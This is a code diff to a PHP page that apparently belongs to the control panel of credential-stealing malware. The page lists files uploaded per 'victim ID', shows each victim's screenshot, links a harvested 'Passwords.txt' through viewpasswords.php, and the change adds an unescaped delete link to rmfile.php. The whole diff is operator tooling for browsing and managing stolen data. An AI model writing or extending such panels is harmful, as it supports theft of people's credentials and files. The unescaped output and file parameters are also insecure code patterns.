@@ -70,7 +70,13 @@ function formatBytes($bytes, $precision = 2) {
               View Uploads</div>
               <div class="card-body">
               	<div class="container text-center">
-
+                  <?php if(isset($_GET['msg'])): ?>
+                    <?php if($_GET['msg'] == "yes"): ?>
+                    <div class="alert alert-success">
+                      <span class="fas fa-check"></span> File has been removed.
+                    </div>
+                    <?php endif; ?>
+                  <?php endif; ?>
               		<?php if(file_exists("upload/$vicID/" . base64_encode($vicID) . ".png")): ?>
               			<a href="<?php echo("upload/$vicID/" . base64_encode($vicID) . ".png"); ?>"><img class="img-fluid rounded border border-secondary" width="60%" height="60%" src="<?php echo("upload/$vicID/" . base64_encode($vicID) . ".png"); ?>"></a>
               		<?php else: ?>
@@ -85,31 +91,35 @@ function formatBytes($bytes, $precision = 2) {
 		                      <th>File Name</th>
 		                      <th>File Size</th>
 		                      <th>File Hash</th>
-		                      <th>Download</th>
+		                      <th>Settings</th>
 		                    </tr>
 		                  </thead>
 		                  <tbody>
 		                  	<?php $i = 1; ?>
-		                  	<?php foreach ($files as $file): ?>
-		                  		<?php if (!(in_array($file, $blacklist))): ?>
-		                  		<tr>
-		                  		<td><?php echo $i; ?></td>
+                        <?php if(!(empty($files))): ?>
+                          <?php foreach ($files as $file): ?>
+                            <?php if (!(in_array($file, $blacklist))): ?>
+                            <tr>
+                            <td><?php echo $i; ?></td>
 
-		                  		<td><?php echo $file; ?></td>
+                            <td><?php echo $file; ?></td>
 
-		                  		<td><?php echo formatBytes(filesize("upload/$vicID/$file")); ?></td>
+                            <td><?php echo formatBytes(filesize("upload/$vicID/$file")); ?></td>
 
-		                  		<td><?php echo md5_file("upload/$vicID/$file"); ?></td>
-
-		                  		<?php if($file == "Passwords.txt"): ?>
-		                  			<td><a href="<?php echo("viewpasswords.php?vicid=$vicID") ?>">Download</a></td>
-		                  		<?php else: ?>
-		                  			<td><a href="<?php echo("upload/$vicID/$file") ?>">Download</a></td>
-		                  		<?php endif; ?>
-		                  	</tr>
-		                      <?php $i++; ?>
-		                  	<?php endif; ?>
-		                  	<?php endforeach; ?>
+                            <td><?php echo md5_file("upload/$vicID/$file"); ?></td>
+                            <td>
+                            <?php if($file == "Passwords.txt"): ?>
+                              <a href="<?php echo("viewpasswords.php?vicid=$vicID") ?>"  class="fas fa-download"></a>
+                            <?php else: ?>
+                              <a href="<?php echo("upload/$vicID/$file") ?>" class="fas fa-download"></a>
+                            <?php endif; ?>
+                              <a href="rmfile.php?fname=<?php echo($file) ?>&vicid=<?php echo($vicID) ?>" class="fas fa-trash-alt"></a>
+                            </td>
+                          </tr>
+                            <?php $i++; ?>
+                          <?php endif; ?>
+                          <?php endforeach; ?>
+                        <?php endif;?>
 		                  </tbody>
 	              		</table>
               		</div>
